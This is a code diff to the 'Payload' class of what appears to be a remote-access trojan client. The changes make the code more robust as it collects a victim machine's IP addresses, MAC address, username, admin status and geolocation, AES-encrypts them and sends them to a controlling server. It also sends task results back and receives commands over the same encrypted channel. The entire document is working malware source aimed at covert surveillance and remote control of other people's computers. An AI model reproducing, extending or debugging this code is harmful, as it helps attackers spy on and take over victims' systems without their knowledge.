@@ -148,30 +148,54 @@ class Payload():
             info = {}
             for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
                 try:
-                    info[function] = globals()[function]()
-                    if isinstance(info[function], bytes):
-                        info[function] = "_b64__" + base64.b64encode(info[function]).decode('utf-8')
+                    result = globals()[function]()
+                    if result:
+                        if isinstance(result, bytes):
+                            try:
+                                info[function] = result.decode('utf-8')
+                            except UnicodeDecodeError:
+                                info[function] = "_b64__" + base64.b64encode(result).decode('utf-8')
+                        else:
+                            info[function] = result
                 except Exception as e:
                     log("{} returned error: {}".format(function, str(e)))
 
             # add owner of session for web application
-            info['owner'] = "_b64__" + base64.b64encode(str(self.owner).encode('utf-8')).decode('utf-8')
+            owner = str(self.owner)
+            if isinstance(owner, bytes):
+                try:
+                    owner = owner.decode('utf-8')
+                except UnicodeDecodeError:
+                    owner = owner.decode('latin-1')
+            info['owner'] = "_b64__" + base64.b64encode(owner.encode('utf-8')).decode('utf-8')
 
             # add geolocation of host machine
-            latitude, longitude = globals()['geolocation']()
-            info['latitude'] = "_b64__" + base64.b64encode(str(latitude).encode('utf-8')).decode('utf-8')
-            info['longitude'] = "_b64__" + base64.b64encode(str(longitude).encode('utf-8')).decode('utf-8')
-
-            # encrypt and send data to server
-            data = globals()['encrypt_aes'](json.dumps(info), self.key)
-            msg = struct.pack('!L', len(data)) + data
-            self.connection.sendall(msg)
+            try:
+                latitude, longitude = globals()['geolocation']()
+                info['latitude'] = latitude
+                info['longitude'] = longitude
+            except Exception as e:
+                log("{} returned error: {}".format('geolocation', str(e)))
+                
+            # ensure all values are strings for JSON serialization
+            for k, v in list(info.items()):
+                if not isinstance(v, (bool, int, float, str, list, dict, type(None))):
+                    info[k] = str(v)
+                    
             return info
         except Exception as e:
-            import traceback
-            print(f"Get info error: {str(e)}")
-            traceback.print_exc()
-            return {}
+            log("Error in _get_info: {}".format(str(e)))
+            return {
+                'public_ip': 'unknown',
+                'local_ip': 'unknown',
+                'platform': 'unknown',
+                'mac_address': 'unknown',
+                'architecture': 'unknown',
+                'username': 'unknown',
+                'administrator': False,
+                'device': 'unknown',
+                'owner': "_b64__" + base64.b64encode(str(self.owner).encode('utf-8')).decode('utf-8')
+            }
 
     @threaded
     def _get_resources(self, target=None, base_url=None):
@@ -985,10 +1009,32 @@ class Payload():
             if not 'session' in task:
                 task['session'] = self.info.get('uid')
             if self.flags.connection.wait(timeout=1.0):
-                data = globals()['encrypt_aes'](json.dumps(task), self.key)
-                msg  = struct.pack('!L', len(data)) + data
-                self.connection.sendall(msg)
-                return True
+                # Handle binary data in task results
+                for key, value in task.items():
+                    if isinstance(value, bytes):
+                        try:
+                            task[key] = value.decode('utf-8')
+                        except UnicodeDecodeError:
+                            # If can't decode as UTF-8, encode as base64
+                            task[key] = "_b64__" + base64.b64encode(value).decode('utf-8')
+                
+                # Convert task to JSON and encrypt
+                try:
+                    json_data = json.dumps(task)
+                    data = globals()['encrypt_aes'](json_data, self.key)
+                    msg = struct.pack('!L', len(data)) + data
+                    self.connection.sendall(msg)
+                    return True
+                except TypeError as e:
+                    log(f"JSON serialization error: {str(e)}. Attempting to sanitize task data.")
+                    # Try to sanitize the task data
+                    sanitized_task = {k: str(v) if not isinstance(v, (bool, int, float, str, list, dict, type(None))) else v 
+                                     for k, v in task.items()}
+                    json_data = json.dumps(sanitized_task)
+                    data = globals()['encrypt_aes'](json_data, self.key)
+                    msg = struct.pack('!L', len(data)) + data
+                    self.connection.sendall(msg)
+                    return True
             return False
         except Exception as e:
             e = str(e)
@@ -1025,9 +1071,25 @@ class Payload():
                 msg_len = struct.unpack('!L', hdr)[0]
                 msg = self.connection.recv(msg_len)
                 data = globals()['decrypt_aes'](msg, self.key)
+                
+                # Try different decodings with error handling
                 if isinstance(data, bytes):
-                    data = data.decode('utf-8')
-                return json.loads(data)
+                    try:
+                        data = data.decode('utf-8')
+                    except UnicodeDecodeError:
+                        try:
+                            # Try with errors='replace' to substitute invalid chars
+                            data = data.decode('utf-8', errors='replace')
+                        except:
+                            # Last resort - use latin-1 which can decode any byte
+                            data = data.decode('latin-1')
+                
+                # Parse JSON data
+                try:
+                    return json.loads(data)
+                except json.JSONDecodeError as e:
+                    log(f"JSON decode error: {str(e)}. Received data: {data[:100]}...")
+                    return {"task": "error", "result": f"JSON decode error: {str(e)}"}
             else:
                 log("{} error: invalid header length".format(self.recv_task.__name__))
                 if not self.connection.recv(hdr_len):
